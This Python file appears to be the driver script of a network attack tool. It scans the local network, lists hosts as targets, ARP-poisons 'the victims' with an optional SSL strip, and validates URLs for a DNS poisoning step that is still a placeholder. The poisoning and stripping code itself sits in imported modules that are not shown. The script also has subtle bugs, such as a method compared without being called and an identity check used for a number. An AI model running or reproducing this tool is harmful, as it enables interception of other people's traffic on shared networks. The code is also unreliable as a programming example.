# some ideas for user dialogues
import parser
import scan
# import validators
import arp, ssl
from urllib.parse import urlparse
import sys

args = parser.import_args()


def is_valid_link(x):
    try:
        result = urlparse(x)
        return all([result.scheme, result.netloc])
    except:
        return False


def spacing():
    print("------------------------------------------------------------------\n")


# scan the network for hosts
def discover():
    interface = ' '
    hosts = ' '
    try:
        interface = scan.interface()
        if not interface:
            raise Exception
    except Exception:
        print("There was an issue with the interface.")
        sys.exit()

    if interface:
        try:
            hosts = scan.ip(interface)
            if not hosts:
                raise Exception
            else:
                print("Successful scanning on the interface", interface)
                spacing()
                print("The following hosts are up and running:")
                counter = 1
                for host in hosts:
                    print("[", counter, "] Host with IP", host[0], "and MAC", host[1]) 
                    counter += 1
        except Exception:
            print("No hosts have been scanned in this interface. Configure some and try again.")
            sys.exit()

    return interface, hosts


def input_checker(val):
    # 0 -> yes
    # 1 -> no
    # everything else -> 2 - error, introduce again

    if val.lower() == 'yes' or val.lower == 'y':
        return 0
    elif val.lower() == 'no' or val.lower == 'n':
        return 1
    else: return 2

interface, hosts = discover()

if args.ARP:
    interval = args.ARP
    spacing()

    # some threads around here i guess
    answr = 2

    answr = input("Want to do SSL strip on the victims while ARP poisoning them? Y/N \n")
    answr = input_checker(answr)

    while answr is 2:
        answr = input("We didn't quite catch that. Yes or no? \n")
        answr = input_checker(answr)

    if answr is 0:
        ssl = ssl.SSLStrip()
        # begin ssl stripping
        ssl.strip()
    else:
        print("Ok, no SSL strip.")

    spacing()

    print("Begin ARP poisoning")

    spacing()

    arp.Poison(interface, hosts, interval).poison()



elif args.DNS:
    websites = args.DNS

    no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
    for url in websites:
        no_issue = no_issue and is_valid_link(url)

    if no_issue:
        # HERE YOU CALL DNS POISONING FUNCTION
        print(websites)
    else:
        print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
        print("------------------------------------------------------------------\n")
        for url in websites:
            if not is_valid_link(url):
                print(
                    "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
